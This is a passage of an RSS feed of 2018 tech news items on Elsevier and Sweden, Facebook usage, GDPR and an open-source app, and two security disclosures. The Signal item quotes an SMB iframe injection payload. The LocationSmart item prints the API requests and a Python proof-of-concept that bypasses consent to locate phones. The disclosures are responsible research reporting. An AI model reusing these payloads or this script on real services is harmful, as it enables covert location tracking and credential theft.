&lt;p&gt;Sweden ends contract with science publisher Elsevier, moving for open access for scientific articles&lt;/p&gt;
&lt;/div&gt;&lt;div readability=&quot;56&quot;&gt;
&lt;p&gt;Elsevier, the publisher of top magazines &lt;em&gt;Cell&lt;/em&gt;, &lt;em&gt;The Lancet&lt;/em&gt; and many others, enjoys billions of dollars in yearly revenue at a high profit margin (37%).&lt;/p&gt;
&lt;p&gt;Sweden, like many other European countries, is aiming for full scientific &quot;open access&quot; (free article reading) by 2026. In 2017, Swedish universities paid Elsevier €1.3M ($1.5M) for article publications and €12M ($14.1M) for access to articles.&lt;/p&gt;
&lt;p&gt;Now Sweden is demanding that Elsevier make Swedish research content fully available to the public and make its 1,900 journals fully available to Swedish researchers, all at a reasonable price to Swedish universities.&lt;/p&gt;
&lt;p&gt;But the Swedes and Elsevier were unable to reach a deal. Starting June 30, Swedish researchers will no longer be publishing in Elsevier and will not have access to Elsevier magazines.&lt;/p&gt;
&lt;p&gt;Feuds between nations and science publishers are becoming quite common. Recently France declined to renew its deal with Springer and Germany battled Elsevier on fees.&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Fri, 18 May 2018 00:23:52 +0000</pubDate>
<dc:creator>rreichman</dc:creator>
<og:image>https://media.snip.today/cache/0f/44/0f445efda92b4b6dc3447aaff80b2420.jpg</og:image>
<og:title>Sweden ends contract with science publisher Elsevier, moving for open access for scientific articles</og:title>
<og:description>Elsevier, the publisher of top magazines Cell, The Lancet and many others, enjoys billions of dollars in yearly revenue at a high...</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.snip.today/post/sweden-ends-contract-with-science-publisher-elsevier-moving-for-open-access-for-scientific-articles/</dc:identifier>
</item>
<item>
<title>Facebook Use Has Been Dropping Since the 2016 Election, According to SimilarWeb</title>
<link>http://nwn.blogs.com/nwn/2018/05/facebook-use-dropped-sharply-after-the-us-election.html</link>
<guid isPermaLink="true" >http://nwn.blogs.com/nwn/2018/05/facebook-use-dropped-sharply-after-the-us-election.html</guid>
<description>&lt;div readability=&quot;54.136363636364&quot;&gt;
&lt;p&gt;&lt;a class=&quot;asset-img-link&quot; href=&quot;http://nwn.blogs.com/.a/6a00d8341bf74053ef0223c84bdda4200c-popup&quot; onclick=&quot;window.open( this.href, '_blank', 'width=640,height=480,scrollbars=no,resizable=no,toolbar=no,directories=no,location=no,menubar=no,status=no,left=0,top=0' ); return false&quot;&gt;&lt;img alt=&quot;Facebook use 2016 election Cambridge Analytica&quot; class=&quot;asset asset-image at-xid-6a00d8341bf74053ef0223c84bdda4200c img-responsive&quot; src=&quot;http://nwn.blogs.com/.a/6a00d8341bf74053ef0223c84bdda4200c-500wi&quot; title=&quot;Facebook use 2016 election Cambridge Analytica&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Last week I noted that Facebook use &lt;a href=&quot;http://nwn.blogs.com/nwn/2018/05/facebook-similarweb-cambridge-analytica.html&quot;&gt;sharply dropped after the Cambridge Analytica scandal&lt;/a&gt;, according to &lt;a href=&quot;https://www.similarweb.com/website/nwn.blogs.com&quot;&gt;SimilarWeb&lt;/a&gt;, but as it turns out, the downward trend started even earlier -- specifically, right around the US Presidential election, in November 2016. (See above.) Since then, total monthly visits to Facebook in the US (both on the web and through the mobile app) have fallen from around 8 billion/month to what it is now, about 5 billion/month -- &lt;em&gt;a loss of some 3 billion visits&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;An analyst with SimilarWeb kindly shared the above data with me -- though for the record, he doesn't necessarily share my belief that the election itself is a causal factor: Rather, he believes there was just &lt;em&gt;more&lt;/em&gt; activity in the run-up to the election (users sharing and arguing over the latest campaign news, and so on) which dropped off after the votes were counted and Trump was announced as winner; and also, on mobile, more Facebook users are using alternate social media apps like Instagram and WhatsApp more. (You can see that mobile usage is what's been declining since November 2016, while desktop usage has remained roughly steady from month to month.)&lt;/p&gt;
&lt;p&gt;That's certainly possible (and definitely part of the downward trend), but I have another interpretation:&lt;/p&gt;
&lt;/div&gt;&lt;div readability=&quot;41&quot;&gt;
&lt;p&gt;Desktop users tend to skew older and are generally associated with daily usage routines (i.e. logging into Facebook from work on the office computer), so it makes sense that desktop Facebook usage would remain steady. Meanwhile, the majority of Facebook usage has been via mobile for years, so it makes sense that this is where usage would take the main hit. In the end, only Facebook itself will know just how much #DeleteFacebook and general user anger at the social network in relation to the election has caused this ongoing drop. What is certain, however, is that the drop is happening.&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Thu, 17 May 2018 22:15:43 +0000</pubDate>
<dc:creator>Kroeler</dc:creator>
<og:title>Facebook Use Has Been Steadily Dropping Since the 2016 US Election, According to SimilarWeb Data</og:title>
<og:type>blog</og:type>
<og:url>http://nwn.blogs.com/nwn/2018/05/facebook-use-dropped-sharply-after-the-us-election.html</og:url>
<og:description>Last week I noted that Facebook use sharply dropped after the Cambridge Analytica scandal, according to SimilarWeb, but as it turns out, the downward trend started even earlier -- specifically, right around the US Presidential election, in November 2016. (See...</og:description>
<og:image>http://nwn.blogs.com/.a/6a00d8341bf74053ef0223c84bdda4200c-600wi</og:image>
<dc:format>text/html</dc:format>
<dc:identifier>http://nwn.blogs.com/nwn/2018/05/facebook-use-dropped-sharply-after-the-us-election.html</dc:identifier>
</item>
<item>
<title>Another flaw in Signal desktop app leaks chats in plaintext</title>
<link>https://thehackernews.com/2018/05/signal-desktop-hacking.html</link>
<guid isPermaLink="true" >https://thehackernews.com/2018/05/signal-desktop-hacking.html</guid>
<description>
&lt;div class=&quot;separator&quot;&gt;
&lt;a href=&quot;https://1.bp.blogspot.com/-16V2b7k40K0/WvsvtoWsTWI/AAAAAAAAwuY/hzeelaoW_lgXw3fXNJiRZ4MZ4l6VdRA_wCLcBGAs/s728-e7/signal-hacking-exploit.png&quot; imageanchor=&quot;1&quot;&gt;&lt;img alt=&quot;signal-hacking-exploit&quot; border=&quot;0&quot; data-original-height=&quot;380&quot; data-original-width=&quot;728&quot; src=&quot;https://1.bp.blogspot.com/-16V2b7k40K0/WvsvtoWsTWI/AAAAAAAAwuY/hzeelaoW_lgXw3fXNJiRZ4MZ4l6VdRA_wCLcBGAs/s728-e7/signal-hacking-exploit.png&quot; title=&quot;signal-hacking-exploit&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
For the second time in less than a week, users of the popular end-to-end encrypted Signal messaging app have to update their desktop applications once again to patch another severe code injection vulnerability.&lt;p&gt;Discovered &lt;a href=&quot;https://ivan.barreraoro.com.ar/signal-desktop-html-tag-injection-variant-2/&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;Monday&lt;/a&gt; by the same team of security researchers, the newly discovered vulnerability poses the same threat as the previous one, allowing remote attackers to inject malicious code on the recipients' Signal desktop app just by sending them a message—without requiring any user interaction.&lt;br/&gt;&lt;/p&gt;&lt;div class=&quot;clear&quot; id=&quot;load-rest&quot;&gt;&lt;ins class=&quot;adsbygoogle&quot; data-ad-client=&quot;ca-pub-7983783048239650&quot; data-ad-format=&quot;link&quot; data-ad-slot=&quot;3375644985&quot;/&gt; &lt;/div&gt;&lt;br/&gt;To understand more about the first &lt;a href=&quot;https://thehackernews.com/2018/05/signal-messenger-code-injection.html&quot; target=&quot;_blank&quot;&gt;code injection vulnerability&lt;/a&gt; (&lt;a href=&quot;https://thehackernews.com/2018/05/signal-messenger-code-injection.html&quot; target=&quot;_blank&quot;&gt;&lt;span id=&quot;goog_505593759&quot;/&gt;CVE-2018-10994&lt;span id=&quot;goog_505593760&quot;/&gt;&lt;/a&gt;), you can read our previous article covering how researchers find the Signal flaw and how it works.&lt;p&gt;The only difference between the two is that the previous flaw resides in the function that handles links shared in the chat, whereas the new vulnerability (CVE-2018-11101) exists in a different function that handles the validation of quoted messages, i.e., quoting a previous message in a reply.&lt;br/&gt;&lt;/p&gt;&lt;div class=&quot;separator&quot;&gt;
&lt;a href=&quot;https://1.bp.blogspot.com/-gBEt6z-Zpqg/Wvsl7tDn2MI/AAAAAAAAwuA/pnoE3t5T0LYpXfTX0pxAdDzs1vgSyAcPwCLcBGAs/s728-e7/signal-code-execution-flaw.png&quot; imageanchor=&quot;1&quot;&gt;&lt;img alt=&quot;signal-code-execution-flaw&quot; border=&quot;0&quot; data-original-height=&quot;380&quot; data-original-width=&quot;728&quot; src=&quot;https://1.bp.blogspot.com/-gBEt6z-Zpqg/Wvsl7tDn2MI/AAAAAAAAwuA/pnoE3t5T0LYpXfTX0pxAdDzs1vgSyAcPwCLcBGAs/s728-e7/signal-code-execution-flaw.png&quot; title=&quot;signal-code-execution-flaw&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
In other words, to exploit the newly patched bug on vulnerable versions of Signal desktop app, all an attacker needs to do is send a malicious HTML/javascript code as a message to the victim, and then quote/reply to that same message with any random text.&lt;p&gt;If the victim receives this quoted message containing the malicious payload on its vulnerable Signal desktop app, it will automatically execute the payload, without requiring any user interaction.&lt;/p&gt;&lt;h3&gt;
Exploiting Signal Code Injection to Steal Plaintext Chats&lt;/h3&gt;
&lt;div class=&quot;video-container&quot;&gt;
&lt;iframe allow=&quot;autoplay; encrypted-media&quot; allowfullscreen=&quot;&quot; frameborder=&quot;0&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/JEoDEg0b_v0?rel=0&amp;amp;showinfo=0&quot; width=&quot;560&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/div&gt;
&lt;br/&gt;Until now the proof-of-concept payloads used to demonstrate code injection vulnerabilities in Signal were limited to embedding an HTML iFrame, or image/video/audio tags onto the victim's desktop app.&lt;p&gt;However, researchers have now managed to craft a &lt;a href=&quot;https://bit.ly/signal-exploit-poc&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;new PoC exploit&lt;/a&gt; that could allow remote attackers to successfully steal all Signal conversations of the victims in the plaintext just by sending them a message.&lt;br/&gt;&lt;/p&gt;&lt;div class=&quot;second-place clear&quot; id=&quot;second-place&quot;&gt; &lt;ins class=&quot;adsbygoogle&quot; data-ad-client=&quot;ca-pub-7983783048239650&quot; data-ad-format=&quot;auto&quot; data-ad-slot=&quot;8662821141&quot;/&gt; &lt;/div&gt;&lt;br/&gt;This hack literally defeats the purpose of an end-to-end encrypted messaging app, allowing remote attackers to easily get the hold on users' plain-text conversations without breaking the encryption.&lt;h3&gt;
Attackers Could Possibly Steal Windows Password As Well&lt;/h3&gt;
&lt;br/&gt;What's worse?&lt;p&gt;In their blog post, the researchers also indicated that an attacker could even include files from a remote SMB share using an HTML iFrame, which can be abused to steal NTLMv2 hashed password for Windows users.&lt;br/&gt;&lt;/p&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;
&quot;In the Windows operative system, the CSP fails to prevent remote inclusion of resources via the SMB protocol. In this case, remote execution of JavaScript can be achieved by referencing the script in an SMB share as the source of an iframe tag, for example: &lt;b&gt;&amp;lt;iframe src=\\DESKTOP-XXXXX\Temp\test.html&amp;gt; &lt;/b&gt;and then replying to it,&quot; the researchers explain.&lt;/blockquote&gt;
Though they haven't claimed anything about this form of attack, I speculate that if an attacker can exploit code injection to force Windows OS to initiate an automatic authentication with the attacker-controlled SMB server using single sign-on, it would eventually hand over victim's username, and NTLMv2 hashed password to the attackers, potentially allowing them to gain access to the victim's system.&lt;p&gt;We have seen how the same attack technique was recently exploited using a &lt;a href=&quot;https://thehackernews.com/2018/04/outlook-smb-vulnerability.html&quot; target=&quot;_blank&quot;&gt;vulnerability in Microsoft Outlook&lt;/a&gt;, disclosed last month.&lt;/p&gt;&lt;p&gt;I can not verify this claim at this moment, but we are in contact with few security researchers to confirm this.&lt;/p&gt;&lt;p&gt;Researchers—Iván Ariel Barrera Oro, Alfredo Ortega, Juliano Rizzo, and Matt Bryant—responsibly reported the vulnerability to Signal, and its developers have patched the vulnerability with the release of &lt;a href=&quot;https://signal.org/download/&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;Signal desktop&lt;/a&gt; version 1.11.0 for Windows, macOS, and Linux users.&lt;/p&gt;&lt;p&gt;However, The Hacker News has learned that Signal developers had already identified this issue as part of a comprehensive fix to the first vulnerability before the researchers found it and reported them.&lt;/p&gt;&lt;p&gt;Signal app has an auto-update mechanism, so most users must have the update already installed. You can &lt;a href=&quot;https://support.signal.org/hc/en-us/articles/360003906531-How-do-I-ensure-Signal-Desktop-is-up-to-date-&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;read this guide&lt;/a&gt; to ensure if you are running updated version of Signal.&lt;/p&gt;&lt;p&gt;And if you don’t, you should immediately update your Signal for desktop as soon as possible, since now the vulnerability poses a severe risk of getting your secret conversations exposed in plaintext to attackers and further severe consequences.&lt;/p&gt;</description>
<pubDate>Thu, 17 May 2018 21:22:30 +0000</pubDate>
<dc:creator>workerthread</dc:creator>
<og:image>https://1.bp.blogspot.com/-16V2b7k40K0/WvsvtoWsTWI/AAAAAAAAwuY/hzeelaoW_lgXw3fXNJiRZ4MZ4l6VdRA_wCLcBGAs/s728-e7/signal-hacking-exploit.png</og:image>
<og:description>Another critical code injection vulnerability found in Signal Desktop app lets remote hackers steal your chats in plaintext</og:description>
<og:type>article</og:type>
<og:url>https://thehackernews.com/2018/05/signal-desktop-hacking.html</og:url>
<og:title>Another severe flaw in Signal desktop app lets hackers steal your chats in plaintext</og:title>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://thehackernews.com/2018/05/signal-desktop-hacking.html</dc:identifier>
</item>
<item>
<title>GDPR: Removing Monal from the EU</title>
<link>https://monal.im/blog/gdpr-removing-monal-from-the-eu/</link>
<guid isPermaLink="true" >https://monal.im/blog/gdpr-removing-monal-from-the-eu/</guid>
<description>&lt;p&gt;As many people know the EU’s GDPR regulations come into effect on May 25th. While Monal is privacy focused, it is also free, open source and run by a single person — me.  I simply do not have the resources or the time to jump through the regulatory hoops required by the EU.  While I do not live in the EU, I frequent Europe and do not want to get into legal trouble on vacation.  As GDPR approaches, I get the impression that it is an end of an era for the internet. The days of someone making something, putting it on the internet and offering it to the world seem to be over.  EU users can always download the source on GitHub and compile the iOS app but they will be blocked from using push when I deploy it.&lt;/p&gt;
&lt;p&gt;The problems below are likely not unique to me and there are &lt;a href=&quot;https://opensource.com/article/18/4/gdpr-impact&quot;&gt;many other issues.&lt;/a&gt; Other open source projects may want to consider their fate under GDPR as well.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Data Protection Officer&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I do not have the resources to hire a &lt;a href=&quot;https://gdpr-info.eu/art-39-gdpr/&quot;&gt;Data Protection Officer&lt;/a&gt; (DPO) or EU Representative as required by GDPR.  I do not have designated EU contacts.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Crashes&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Tracking crashes with Crashlytics introduces new issues because it is posted to Fabric from a user’s device,  IP addresses are in the logs this is  personally identifiable information  (PII).  Crashlytics  is &lt;a href=&quot;https://docs.fabric.io/apple/fabric/data-privacy.html?utm_source=blog&amp;amp;utm_medium=blog&amp;amp;utm_campaign=fabric_gdpr#fabric-will-be-gdpr-ready&quot;&gt;GDPR compliant&lt;/a&gt; but the burden is on me to show  regulators that I am compliant points back to the need for DPO.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Push&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Even though no message traffic passes through Monal’s sever, registering for a push does make an HTTP call which logs a user’s IP and this  requires GDPR compliance.  APNS push tokens are associated with devices which can be traced back to a user if combined with info on the originating XMPP server. Obviously, this is needed for a notification to be delivered to the right person. However,the fact that it can be combined to identify a person makes it PII. I believe in privacy but I do not have the resources to meet the letter of the law for compliance especially with respect to retention and processing these tokens.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;XMPP Federation in General&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Honestly, I do not know if XMPP federation is legal anymore in the EU with GDPR.  EU user data is sent out of Europe constantly.  GDPR is written such that a user cannot agree to a user agreement that gives up GDPR requirements it’s not a matter of saying you agree to X by using this service. GDPR compliance is something the XSF is talking about &lt;a href=&quot;https://wiki.xmpp.org/web/GDPR&quot;&gt;right now&lt;/a&gt;.&lt;/p&gt;


</description>
<pubDate>Thu, 17 May 2018 20:16:35 +0000</pubDate>
<dc:creator>maufl</dc:creator>
<og:title>GDPR: Removing Monal from the EU</og:title>
<og:url>https://monal.im/blog/gdpr-removing-monal-from-the-eu/</og:url>
<og:type>article</og:type>
<og:description>As many people know the EU's GDPR regulations come into effect on May 25th. While Monal is privacy focused, it is also free, open source and run by a single person -- me.  I simply do not have the resources or the time to jump through the regulatory hoops required by the EU.  While I do not live in</og:description>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://monal.im/blog/gdpr-removing-monal-from-the-eu/</dc:identifier>
</item>
<item>
<title>LocationSmart Leaked Location Data for All Major U.S. Carriers in Real Time</title>
<link>https://www.robertxiao.ca/hacking/locationsmart/</link>
<guid isPermaLink="true" >https://www.robertxiao.ca/hacking/locationsmart/</guid>
<description>&lt;p&gt;On May 16th, I found a vulnerability in the LocationSmart website which allowed anyone, with no prior authentication or consent, to obtain the realtime location of any cellphone in the US to within a few hundred feet. I immediately moved to contact US CERT to coordinate disclosure, and worked with Brian Krebs to &lt;a href=&quot;https://krebsonsecurity.com/2018/05/tracking-firm-locationsmart-leaked-location-data-for-customers-of-all-major-u-s-mobile-carriers-in-real-time-via-its-web-site/&quot;&gt;publish the story&lt;/a&gt; after the vulnerability was fixed this morning (May 17th).&lt;/p&gt;
&lt;p&gt;Now that I have verified that the vulnerability is fixed, I am releasing the relevant technical details of the bug and exploit.&lt;/p&gt;
&lt;h3&gt;Introduction&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.locationsmart.com/&quot;&gt;LocationSmart&lt;/a&gt; is a cellphone location tracking service which was recently in the news (e.g. &lt;a href=&quot;https://www.zdnet.com/article/us-cell-carriers-selling-access-to-real-time-location-data/&quot;&gt;[1]&lt;/a&gt;, &lt;a href=&quot;https://arstechnica.com/tech-policy/2018/05/senator-furious-at-polices-easy-ability-to-get-real-time-mobile-location-data/&quot;&gt;[2]&lt;/a&gt;) for selling location data to third party Securus, who then improperly disclosed it to a former law enforcement official. LocationSmart partners with various telecom companies to obtain the real-time location of mobile customers via cell-tower triangulation (same approach as E911 localization), counting among its partners Verizon &lt;a href=&quot;https://archive.li/tCLrd&quot;&gt;[3]&lt;/a&gt;, AT&amp;amp;T, T-Mobile, Sprint, and Canadian carriers Bell, Rogers and Telus. LocationSmart then sells the location data to other companies, for purposes including geolocated assistance and marketing. Note that because this is carrier-based, it works regardless of phone operating system or the privacy settings on the device itself. There is no ability to opt-out.&lt;/p&gt;
&lt;h3&gt;Background&lt;/h3&gt;
&lt;p&gt;LocationSmart provided a trial webpage, located at &lt;a href=&quot;https://www.locationsmart.com/try/&quot;&gt;https://www.locationsmart.com/try/&lt;/a&gt;, where anyone can enter a cellphone number, reply to a consent request (delivered via either SMS or phone call to the target number), and see the real-time location of that number. The intention is that the phone call or text-message reply is necessary for a user to “opt-in” to the location tracking demonstration.&lt;/p&gt;
&lt;p&gt;After selecting to track “My Mobile”, the page makes a POST request to &lt;a href=&quot;https://www.locationsmart.com/try/api/&quot;&gt;https://www.locationsmart.com/try/api/&lt;/a&gt; with the following payload (with 8005551212 replacing the real phone number):&lt;/p&gt;
&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;
requestdata={&quot;deviceType&quot;:&quot;Wireless&quot;,&quot;deviceID&quot;:&quot;8005551212&quot;,&quot;devicedetails&quot;:&quot;true&quot;,&quot;carrierReq&quot;:&quot;true&quot;}&amp;amp;requesttype=statusreq.json
&lt;/pre&gt;
&lt;p&gt;If the selected phone number is valid, this will reply&lt;/p&gt;
&lt;pre class=&quot;brush: jscript; title: ; notranslate&quot; title=&quot;&quot;&gt;
{&quot;uid&quot;:&quot;REDACTED&quot;,&quot;requestTime&quot;:&quot;2018-05-16T21:25:50.689+00:00&quot;,&quot;statusCode&quot;:0,&quot;statusMsg&quot;:&quot;Success&quot;,&quot;deviceId&quot;:&quot;8005551212&quot;,&quot;token&quot;:&quot;TOKEN&quot;,&quot;locatable&quot;:&quot;True&quot;,&quot;network&quot;:{&quot;carrier&quot;:&quot;T-Mobile&quot;,&quot;locatable&quot;:&quot;True&quot;,&quot;callType&quot;:&quot;wireless&quot;,&quot;locAccuracySupport&quot;:&quot;Precise Possible&quot;,&quot;nationalNumber&quot;:&quot;8005551212&quot;,&quot;countryCode&quot;:&quot;1&quot;,&quot;regionCode&quot;:&quot;US&quot;,&quot;regionCountry&quot;:&quot;UNITED STATES&quot;},&quot;subscriptionGroup&quot;:[{&quot;name&quot;:&quot;LOCA-D01-LOCNOPIN&quot;,&quot;locatable&quot;:&quot;False&quot;,&quot;smsAvailable&quot;:&quot;False&quot;},{&quot;name&quot;:&quot;LOCA-D02-WELCOME&quot;,&quot;locatable&quot;:&quot;False&quot;,&quot;smsAvailable&quot;:&quot;False&quot;}],&quot;smsAvailable&quot;:&quot;True&quot;,&quot;privacyConsentRequired&quot;:&quot;True&quot;,&quot;clientLocatable&quot;:&quot;false&quot;,&quot;clientSMSAvailable&quot;:&quot;Not supported&quot;,&quot;whiteListed&quot;:&quot;false&quot;}
&lt;/pre&gt;
&lt;p&gt;(Some fields have been anonymized). The TOKEN is a 12-byte value, which decodes using a modified version of Base64 to a nanosecond-precision timestamp.&lt;/p&gt;
&lt;p&gt;The webpage then repeatedly POSTs to the same endpoint with the following payload:&lt;/p&gt;
&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;
requestdata={&quot;subscriptionAction&quot;:&quot;status&quot;,&quot;tn&quot;:&quot;8005551212&quot;,&quot;carrierReq&quot;:&quot;true&quot;}&amp;amp;requesttype=subscriptionreq
&lt;/pre&gt;
&lt;p&gt;and receives an XML payload formatted like&lt;/p&gt;
&lt;pre class=&quot;brush: xml; title: ; notranslate&quot; title=&quot;&quot;&gt;
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;SubscriptionResp&amp;gt;
  &amp;lt;uid&amp;gt;REDACTED&amp;lt;/uid&amp;gt;
  &amp;lt;requestTime&amp;gt;2018-05-17T00:43:44.631+00:00&amp;lt;/requestTime&amp;gt;
  &amp;lt;statusCode&amp;gt;0&amp;lt;/statusCode&amp;gt;
  &amp;lt;statusMsg&amp;gt;Success&amp;lt;/statusMsg&amp;gt;
  &amp;lt;tn&amp;gt;8005551212&amp;lt;/tn&amp;gt;
  &amp;lt;subscriptionGroup&amp;gt;LOCA-D01-LOCNOPIN&amp;lt;/subscriptionGroup&amp;gt;
  &amp;lt;subscriptionOptInState&amp;gt;requested&amp;lt;/subscriptionOptInState&amp;gt;
  &amp;lt;contact&amp;gt;sms&amp;lt;/contact&amp;gt;
&amp;lt;/SubscriptionResp&amp;gt;
&lt;/pre&gt;
&lt;p&gt;It waits for the response &lt;code&gt;subscriptionOptInState&lt;/code&gt; to change to &lt;code&gt;approved&lt;/code&gt;, then makes a final POST request to the same endpoint with the following payload:&lt;/p&gt;
&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;
requestdata={&quot;civicAddressReq&quot;:&quot;True&quot;,&quot;geoAddressReq&quot;:&quot;True&quot;,&quot;extAddressReq&quot;:&quot;True&quot;,&quot;nearbyPoiReq&quot;:&quot;True&quot;,&quot;privacyConsent&quot;:&quot;True&quot;,&quot;token&quot;:&quot;TOKEN&quot;,&quot;locationtype&quot;:&quot;network&quot;,&quot;accuracyReq&quot;:&quot;Coarse&quot;,&quot;tnDetailReq&quot;:&quot;False&quot;,&quot;carrierReq&quot;:&quot;true&quot;}&amp;amp;requesttype=locreq
&lt;/pre&gt;
&lt;p&gt;This replies with an XML payload containing the target device’s location. Note that the &lt;code&gt;token&lt;/code&gt; is the only identifier that varies in this request, and it is the same as the token obtained from the &lt;code&gt;statusreq&lt;/code&gt; request.&lt;/p&gt;
&lt;p&gt;If you make a similar POST request to a phone that has not consented to location tracking, you get a payload like&lt;/p&gt;
&lt;pre class=&quot;brush: xml; title: ; notranslate&quot; title=&quot;&quot;&gt;
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;LocResp&amp;gt;
  &amp;lt;uid&amp;gt;REDACTED&amp;lt;/uid&amp;gt;
  &amp;lt;requestTime&amp;gt;2018-05-17T00:03:46.073+00:00&amp;lt;/requestTime&amp;gt;
  &amp;lt;statusCode&amp;gt;42&amp;lt;/statusCode&amp;gt;
  &amp;lt;statusMsg&amp;gt;SubscriptionNotActive&amp;lt;/statusMsg&amp;gt;
  &amp;lt;carrier&amp;gt;T-Mobile&amp;lt;/carrier&amp;gt;
  &amp;lt;deviceId&amp;gt;8005551212&amp;lt;/deviceId&amp;gt;
  &amp;lt;tn&amp;gt;8005551212&amp;lt;/tn&amp;gt;
&amp;lt;/LocResp&amp;gt;
&lt;/pre&gt;
&lt;h3&gt;Vulnerability&lt;/h3&gt;
&lt;p&gt;If you make the &lt;em&gt;same&lt;/em&gt; request with &lt;code&gt;requesttype=locreq.json&lt;/code&gt;, you get the full location data, &lt;strong&gt;without&lt;/strong&gt; receiving consent. This is the heart of the bug. Essentially, this requests the location data in JSON format, instead of the default XML format. For some reason, this also suppresses the consent (“subscription”) check.&lt;/p&gt;
&lt;p&gt;In essence, you can do the following:&lt;/p&gt;
&lt;ol readability=&quot;7.5&quot;&gt;&lt;li readability=&quot;3&quot;&gt;POST with
&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;
requestdata={&quot;deviceType&quot;:&quot;Wireless&quot;,&quot;deviceID&quot;:&quot;NUMBER&quot;,&quot;devicedetails&quot;:&quot;true&quot;,&quot;carrierReq&quot;:&quot;true&quot;}&amp;amp;requesttype=statusreq.json
&lt;/pre&gt;
&lt;p&gt;to get a token&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;12&quot;&gt;POST with
&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;
requestdata={&quot;civicAddressReq&quot;:&quot;True&quot;,&quot;geoAddressReq&quot;:&quot;True&quot;,&quot;extAddressReq&quot;:&quot;True&quot;,&quot;nearbyPoiReq&quot;:&quot;True&quot;,&quot;privacyConsent&quot;:&quot;True&quot;,&quot;token&quot;:&quot;TOKEN&quot;,&quot;locationtype&quot;:&quot;network&quot;,&quot;accuracyReq&quot;:&quot;Coarse&quot;,&quot;tnDetailReq&quot;:&quot;False&quot;,&quot;carrierReq&quot;:&quot;true&quot;}&amp;amp;requesttype=locreq.json
&lt;/pre&gt;
&lt;p&gt;and wait a few seconds to get a location&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;That’s all. The entire consent process is bypassed and you have the phone’s location. Here is the proof-of-concept Python script I built to demonstrate the issue:&lt;/p&gt;
&lt;pre class=&quot;brush: python; title: ; notranslate&quot; title=&quot;&quot;&gt;
#!/usr/bin/env python3

import requests
import json
import sys
import webbrowser

if len(sys.argv) &amp;gt;= 2:
    phone = sys.argv[1]
else:
    phone = input(&quot;Phone number? &quot;)

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:60.0) Gecko/20100101 Firefox/60.0',
    'DNT': '1'
}

r1 = requests.post('https://www.locationsmart.com/try/api/',
    headers=headers,
    data={
        'requestdata': json.dumps({&quot;deviceType&quot;:&quot;Wireless&quot;,&quot;deviceID&quot;:phone,&quot;devicedetails&quot;:&quot;true&quot;,&quot;carrierReq&quot;:&quot;true&quot;}),
        'requesttype': 'statusreq.json'
    }
)

data = r1.json()

r2 = requests.post('https://www.locationsmart.com/try/api/',
    headers=headers,
    data={
        'requestdata': json.dumps({&quot;civicAddressReq&quot;:&quot;True&quot;,&quot;geoAddressReq&quot;:&quot;True&quot;,&quot;extAddressReq&quot;:&quot;True&quot;,&quot;nearbyPoiReq&quot;:&quot;True&quot;,&quot;privacyConsent&quot;:&quot;True&quot;,&quot;token&quot;:data['token'],&quot;locationtype&quot;:&quot;network&quot;,&quot;accuracyReq&quot;:&quot;Coarse&quot;,&quot;tnDetailReq&quot;:&quot;true&quot;,&quot;carrierReq&quot;:&quot;true&quot;}),
        'requesttype': 'locreq.json'
    }
)

data2 = r2.json()

if 'civicAddress' in data2:
    print('{phone}: near {streetAddress}, {city}, {state} {zip}'.format(phone=phone, **data2['civicAddress']))

if 'geoAddress' in data2:
    url = 'http://localhost:8000/location.html?lat={coordinates[1]}&amp;amp;lng={coordinates[0]}&amp;amp;acc={accuracy}'.format(**data2['geoAddress'])
    webbrowser.open_new_tab(url)
&lt;/pre&gt;
&lt;p&gt;This pops up a simple HTML page that draws a circle of radius &lt;code&gt;acc&lt;/code&gt; at coordinates &lt;code&gt;lat, lng&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;sharedaddy sd-sharing-enabled&quot;&gt;
&lt;div class=&quot;robots-nocontent sd-block sd-social sd-social-icon sd-sharing&quot;&gt;
&lt;h3 class=&quot;sd-title&quot;&gt;Share this:&lt;/h3&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;
&lt;h3 class=&quot;jp-relatedposts-headline&quot;&gt;&lt;em&gt;Related&lt;/em&gt;&lt;/h3&gt;
&lt;/p&gt;
</description>
<pubDate>Thu, 17 May 2018 18:45:05 +0000</pubDate>
<dc:creator>uptown</dc:creator>
<og:type>article</og:type>
